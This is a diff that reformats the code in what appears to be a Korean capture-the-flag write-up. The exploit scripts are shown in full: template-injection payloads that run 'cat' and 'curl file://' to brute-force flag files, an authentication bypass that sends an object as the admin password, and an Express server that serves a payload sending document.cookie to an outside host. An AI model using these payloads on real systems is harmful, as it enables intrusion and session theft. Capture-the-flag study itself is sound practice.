@@ -108,13 +108,13 @@ mutation {
   }
 }`;
 const response3 = await fetch('/graphql', {
-	method: 'POST',
-	headers: {
-		'Content-Type': 'application/json'
-	},
-	body: JSON.stringify({
-		query: book_content_query
-	})
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  body: JSON.stringify({
+    query: book_content_query,
+  }),
 });
 ```
 
@@ -208,27 +208,27 @@ html := `<!DOCTYPE html>
 import { create } from './utils/';
 
 const r = create({
-	baseURL: 'http://hackbox.kospo.co.kr:20002'
+  baseURL: 'http://hackbox.kospo.co.kr:20002',
 });
 
 for (let i of 'abcdef01234') {
-	console.info(i);
-	for (let j of 'abcdef01234') {
-		for (let k of 'abcdef01234') {
-			for (let l of 'abcdef01234') {
-				const res = await r.get('/', {
-					params: {
-						name: `{{getDate "cat" "/flag${i}${j}${k}${l}"}}`
-					}
-				});
-				console.log(res.data.split('<h1>')[1].split('</h1>')[0].trim());
-				if (!res.data.includes('No')) {
-					console.log(res.data);
-					process.exit(0);
-				}
-			}
-		}
-	}
+  console.info(i);
+  for (let j of 'abcdef01234') {
+    for (let k of 'abcdef01234') {
+      for (let l of 'abcdef01234') {
+        const res = await r.get('/', {
+          params: {
+            name: `{{getDate "cat" "/flag${i}${j}${k}${l}"}}`,
+          },
+        });
+        console.log(res.data.split('<h1>')[1].split('</h1>')[0].trim());
+        if (!res.data.includes('No')) {
+          console.log(res.data);
+          process.exit(0);
+        }
+      }
+    }
+  }
 }
 ```
 
@@ -238,13 +238,13 @@ for (let i of 'abcdef01234') {
 import { create } from './utils/';
 
 const r = create({
-	baseURL: 'http://hackbox.kospo.co.kr:20002'
+  baseURL: 'http://hackbox.kospo.co.kr:20002',
 });
 
 const res = await r.get('/', {
-	params: {
-		name: `{{getDate "curl" "file:///flag{a,b,c,d,e,f,0,1,2,3,4}{a,b,c,d,e,f,0,1,2,3,4}{a,b,c,d,e,f,0,1,2,3,4}{a,b,c,d,e,f,0,1,2,3,4}"}}`
-	}
+  params: {
+    name: `{{getDate "curl" "file:///flag{a,b,c,d,e,f,0,1,2,3,4}{a,b,c,d,e,f,0,1,2,3,4}{a,b,c,d,e,f,0,1,2,3,4}{a,b,c,d,e,f,0,1,2,3,4}"}}`,
+  },
 });
 console.log(res.data.split('<h1>')[1].split('</h1>')[0].trim());
 ```
@@ -259,61 +259,67 @@ console.log(res.data.split('<h1>')[1].split('</h1>')[0].trim());
 
 ```javascript
 router.post('/new', (req, res, next) => {
-	let page_uuid = uuid.v4();
-	db.query(
-		'INSERT INTO board (uuid, title, content, username, admin_viewed) VALUES (?, ?, ?, ?, ?)',
-		[page_uuid, req.body.title, req.body.content, req.user.username, false],
-		(error, results, fields) => {
-			if (error) {
-				return next(error);
-			}
-			res.redirect(`./view/${page_uuid}`);
-		}
-	);
+  let page_uuid = uuid.v4();
+  db.query(
+    'INSERT INTO board (uuid, title, content, username, admin_viewed) VALUES (?, ?, ?, ?, ?)',
+    [page_uuid, req.body.title, req.body.content, req.user.username, false],
+    (error, results, fields) => {
+      if (error) {
+        return next(error);
+      }
+      res.redirect(`./view/${page_uuid}`);
+    },
+  );
 });
 router.get('/view/:uuid', (req, res, next) => {
-	db.query('SELECT * FROM board WHERE uuid = ?', [req.params.uuid], (error, results, fields) => {
-		if (error) {
-			return next(error);
-		}
-		if (!results[0]) {
-			return res.sendStatus(404);
-		}
-		console.log(results);
-		let content_user = results[0].username;
-		let content = results[0].content;
-		db.query('SELECT * FROM users WHERE username = ?', [content_user], (error, results, fields) => {
-			if (error) {
-				return next(error);
-			}
-			if (!results[0]) {
-				return res.sendStatus(500);
-			}
-			console.log(results);
-			let nonceFlag = results[0].nonce_flag; // nonce_flag는 admin 계정만 참이며, 아닌 경우는 모두 false이다.
-			let _nonce = uuid.v4();
-			if (nonceFlag) {
-				db.query(
-					'SELECT nonce FROM nonces WHERE username = ?',
-					[content_user],
-					(error, results, fields) => {
-						if (error) {
-							return next(error);
-						}
-						if (!results[0]) {
-							db.query(
-								'INSERT INTO nonces (username, nonce) VALUES (?, ?)',
-								[content_user, _nonce],
-								(err) => {
-									if (err) {
-										return next(err);
-									}
-								}
-							);
-						} else {
-							_nonce = results[0].nonce;
-						}
-						res.send(`
+  db.query(
+    'SELECT * FROM board WHERE uuid = ?',
+    [req.params.uuid],
+    (error, results, fields) => {
+      if (error) {
+        return next(error);
+      }
+      if (!results[0]) {
+        return res.sendStatus(404);
+      }
+      console.log(results);
+      let content_user = results[0].username;
+      let content = results[0].content;
+      db.query(
+        'SELECT * FROM users WHERE username = ?',
+        [content_user],
+        (error, results, fields) => {
+          if (error) {
+            return next(error);
+          }
+          if (!results[0]) {
+            return res.sendStatus(500);
+          }
+          console.log(results);
+          let nonceFlag = results[0].nonce_flag; // nonce_flag는 admin 계정만 참이며, 아닌 경우는 모두 false이다.
+          let _nonce = uuid.v4();
+          if (nonceFlag) {
+            db.query(
+              'SELECT nonce FROM nonces WHERE username = ?',
+              [content_user],
+              (error, results, fields) => {
+                if (error) {
+                  return next(error);
+                }
+                if (!results[0]) {
+                  db.query(
+                    'INSERT INTO nonces (username, nonce) VALUES (?, ?)',
+                    [content_user, _nonce],
+                    (err) => {
+                      if (err) {
+                        return next(err);
+                      }
+                    },
+                  );
+                } else {
+                  _nonce = results[0].nonce;
+                }
+                res.send(`
                         <html>
                         <head>
                             <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'nonce-${_nonce}'; style-src 'self' 'unsafe-inline'; img-src *;">
@@ -322,10 +328,10 @@ router.get('/view/:uuid', (req, res, next) => {
                         </head>
                         </html>
                     `);
-					}
-				);
-			} else {
-				res.send(`
+              },
+            );
+          } else {
+            res.send(`
                     <html>
                     <head>
                         <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'nonce-${_nonce}'; style-src 'self' 'unsafe-inline'; img-src *;">
@@ -334,9 +340,11 @@ router.get('/view/:uuid', (req, res, next) => {
                     </head>
                     </html>
                 `);
-			}
-		});
-	});
+          }
+        },
+      );
+    },
+  );
 });
 ```
 
@@ -351,30 +359,32 @@ router.get('/view/:uuid', (req, res, next) => {
 
 ```javascript
 passport.use(
-	new Strategy(function (req, cb) {
-		let username = req.body.username;
-		let password = req.body.password;
-		console.log(username, password);
-		db.query(
-			'SELECT * FROM users WHERE username = ? AND password = ?',
-			[username, password],
-			function (err, row, fields) {
-				if (err) {
-					return cb(err);
-				}
-				if (!row[0]) {
-					return cb(null, false, { message: 'Incorrect username or password.' });
-				}
-				console.log(row);
-				var user = {
-					id: row[0].id,
-					username: row[0].username,
-					nonceFlag: row[0].nonce_flag
-				};
-				return cb(null, user);
-			}
-		);
-	})
+  new Strategy(function (req, cb) {
+    let username = req.body.username;
+    let password = req.body.password;
+    console.log(username, password);
+    db.query(
+      'SELECT * FROM users WHERE username = ? AND password = ?',
+      [username, password],
+      function (err, row, fields) {
+        if (err) {
+          return cb(err);
+        }
+        if (!row[0]) {
+          return cb(null, false, {
+            message: 'Incorrect username or password.',
+          });
+        }
+        console.log(row);
+        var user = {
+          id: row[0].id,
+          username: row[0].username,
+          nonceFlag: row[0].nonce_flag,
+        };
+        return cb(null, user);
+      },
+    );
+  }),
 );
 ```
 
@@ -383,23 +393,23 @@ passport.use(
 ```typescript
 import { create } from './utils/';
 const r = create({
-	baseURL: 'http://hackbox.kospo.co.kr:41324/'
+  baseURL: 'http://hackbox.kospo.co.kr:41324/',
 });
 await r
-	.post(
-		'/login',
-		{
-			username: 'admin',
-			password: {
-				username: 0
-			}
-		},
-		{
-			maxRedirects: 0,
-			validateStatus: (status) => status === 302
-		}
-	)
-	.then((res) => console.info(res.headers, res.status));
+  .post(
+    '/login',
+    {
+      username: 'admin',
+      password: {
+        username: 0,
+      },
+    },
+    {
+      maxRedirects: 0,
+      validateStatus: (status) => status === 302,
+    },
+  )
+  .then((res) => console.info(res.headers, res.status));
 ```
 
 그러면, `admin` 계정을 탈취할 수 있고, `nonce`를 얻을 수 있다.
@@ -411,12 +421,14 @@ await r
 import express from 'express';
 const app = express();
 app.use('*', (req, res) => {
-	console.info(req.query);
-	console.info(req.headers);
-	res.status(200).send('location.href="https://h.bmcyver.dev/?"+document.cookie');
+  console.info(req.query);
+  console.info(req.headers);
+  res
+    .status(200)
+    .send('location.href="https://h.bmcyver.dev/?"+document.cookie');
 });
 app.listen(3000, '0.0.0.0', () => {
-	console.log('Server started on http://0.0.0.0:3000');
+  console.log('Server started on http://0.0.0.0:3000');
 });
 ```
 
@@ -440,108 +452,108 @@ import * as cheerio from 'cheerio';
 import { create } from './utils/';
 
 const axios = create({
-	baseURL: 'http://hackbox.kospo.co.kr:16667'
+  baseURL: 'http://hackbox.kospo.co.kr:16667',
 });
 
 async function shortestPath(grid: string[][]): Promise<number> {
-	const directions: number[][] = [
-		[0, 1], // right
-		[1, 0], // down
-		[0, -1], // left
-		[-1, 0] // up
-	];
+  const directions: number[][] = [
+    [0, 1], // right
+    [1, 0], // down
+    [0, -1], // left
+    [-1, 0], // up
+  ];
 
-	const rows: number = grid.length;
-	const cols: number = grid[0].length;
+  const rows: number = grid.length;
+  const cols: number = grid[0].length;
 
-	let start: number[] | null = null;
-	let end: number[] | null = null;
+  let start: number[] | null = null;
+  let end: number[] | null = null;
 
-	// Find start and end points
-	for (let i = 0; i < rows; i++) {
-		for (let j = 0; j < cols; j++) {
-			if (grid[i][j] === '@') {
-				start = [i, j];
-			} else if (grid[i][j] === '#') {
-				end = [i, j];
-			}
-		}
-	}
+  // Find start and end points
+  for (let i = 0; i < rows; i++) {
+    for (let j = 0; j < cols; j++) {
+      if (grid[i][j] === '@') {
+        start = [i, j];
+      } else if (grid[i][j] === '#') {
+        end = [i, j];
+      }
+    }
+  }
 
-	if (!start || !end) return -1;
+  if (!start || !end) return -1;
 
-	const queue: Array<[number, number, number]> = [[start[0], start[1], 0]];
-	const visited: Set<string> = new Set();
-	visited.add(start[0] + ',' + start[1]);
+  const queue: Array<[number, number, number]> = [[start[0], start[1], 0]];
+  const visited: Set<string> = new Set();
+  visited.add(start[0] + ',' + start[1]);
 
-	while (queue.length > 0) {
-		const [x, y, distance] = queue.shift()!;
+  while (queue.length > 0) {
+    const [x, y, distance] = queue.shift()!;
 
-		if (x === end[0] && y === end[1]) {
-			return distance;
-		}
+    if (x === end[0] && y === end[1]) {
+      return distance;
+    }
 
-		for (const [dx, dy] of directions) {
-			const newX = x + dx;
-			const newY = y + dy;
+    for (const [dx, dy] of directions) {
+      const newX = x + dx;
+      const newY = y + dy;
 
-			if (
-				newX >= 0 &&
-				newX < rows &&
-				newY >= 0 &&
-				newY < cols &&
-				grid[newX][newY] !== '1' &&
-				!visited.has(newX + ',' + newY)
-			) {
-				visited.add(newX + ',' + newY);
-				queue.push([newX, newY, distance + 1]);
-			}
-		}
-	}
-	return -1;
+      if (
+        newX >= 0 &&
+        newX < rows &&
+        newY >= 0 &&
+        newY < cols &&
+        grid[newX][newY] !== '1' &&
+        !visited.has(newX + ',' + newY)
+      ) {
+        visited.add(newX + ',' + newY);
+        queue.push([newX, newY, distance + 1]);
+      }
+    }
+  }
+  return -1;
 }
 let step_1 = 1;
 
 async function parseMaze(): Promise<void> {
-	const { data } = await axios.get('/stage');
-	const $ = cheerio.load(data);
+  const { data } = await axios.get('/stage');
+  const $ = cheerio.load(data);
 
-	const cells = $('.maze .cell');
-	const grid: string[][] = [];
-	let rows: number = 10 + step_1;
-	let cols: number = 10 + step_1;
-	if (rows > 30) {
-		rows = 30;
-		cols = 30;
-	}
-	console.info(cells.length);
-	for (let i = 0; i < rows; i++) {
-		const row: string[] = [];
-		for (let j = 0; j < cols; j++) {
-			const cell = $(cells[i * cols + j]);
-			if (cell.hasClass('wall')) {
-				row.push('1');
-			} else if (cell.hasClass('start')) {
-				row.push('@');
-			} else if (cell.hasClass('end')) {
-				row.push('#');
-			} else {
-				row.push('0');
-			}
-		}
-		grid.push(row);
-	}
+  const cells = $('.maze .cell');
+  const grid: string[][] = [];
+  let rows: number = 10 + step_1;
+  let cols: number = 10 + step_1;
+  if (rows > 30) {
+    rows = 30;
+    cols = 30;
+  }
+  console.info(cells.length);
+  for (let i = 0; i < rows; i++) {
+    const row: string[] = [];
+    for (let j = 0; j < cols; j++) {
+      const cell = $(cells[i * cols + j]);
+      if (cell.hasClass('wall')) {
+        row.push('1');
+      } else if (cell.hasClass('start')) {
+        row.push('@');
+      } else if (cell.hasClass('end')) {
+        row.push('#');
+      } else {
+        row.push('0');
+      }
+    }
+    grid.push(row);
+  }
 
-	const step: number = await shortestPath(grid);
-	console.info('최단 경로:', step);
-	await axios.postForm('/stage', { steps: step }).then(async (res) => {
-		console.info(res.data);
-		if (res.data.includes('통과')) {
-			console.info('통과', step_1);
-			step_1++;
-			await parseMaze();
-		}
-	});
+  const step: number = await shortestPath(grid);
+  console.info('최단 경로:', step);
+  await axios.postForm('/stage', { steps: step }).then(async (res) => {
+    console.info(res.data);
+    if (res.data.includes('통과')) {
+      console.info('통과', step_1);
+      step_1++;
+      await parseMaze();
+    }
+  });
 }
 
 parseMaze();
@@ -561,45 +573,47 @@ parseMaze();
 import { create } from './utils/';
 
 const r = create({
-	baseURL: 'http://hackbox.kospo.co.kr:14447'
+  baseURL: 'http://hackbox.kospo.co.kr:14447',
 });
 
 const decoder = () =>
-	JSON.parse(Buffer.from(r.getCookie('session')?.split('.')[0]!, 'base64').toString());
+  JSON.parse(
+    Buffer.from(r.getCookie('session')?.split('.')[0]!, 'base64').toString(),
+  );
 
 await r.get('/', {
-	maxRedirects: 0,
-	validateStatus: (status) => status === 302
+  maxRedirects: 0,
+  validateStatus: (status) => status === 302,
 });
 
 await r.get('/captcha', {
-	maxRedirects: 0
+  maxRedirects: 0,
 });
 
 for (let i = 0; i < 31; i++) {
-	const data = decoder();
-	console.log(data);
-	await r
-		.postForm(
-			'/submit',
-			{
-				captcha: data.captcha_text
-			},
-			{
-				maxRedirects: 0,
-				validateStatus: (status) => status === 302
-			}
-		)
-		.then((res) => {
-			console.info(res.data);
-		});
-	await r
-		.get('/captcha', {
-			maxRedirects: 0
-		})
-		.then((res) => {
-			console.info(res.data);
-		});
+  const data = decoder();
+  console.log(data);
+  await r
+    .postForm(
+      '/submit',
+      {
+        captcha: data.captcha_text,
+      },
+      {
+        maxRedirects: 0,
+        validateStatus: (status) => status === 302,
+      },
+    )
+    .then((res) => {
+      console.info(res.data);
+    });
+  await r
+    .get('/captcha', {
+      maxRedirects: 0,
+    })
+    .then((res) => {
+      console.info(res.data);
+    });
 }
 ```
 
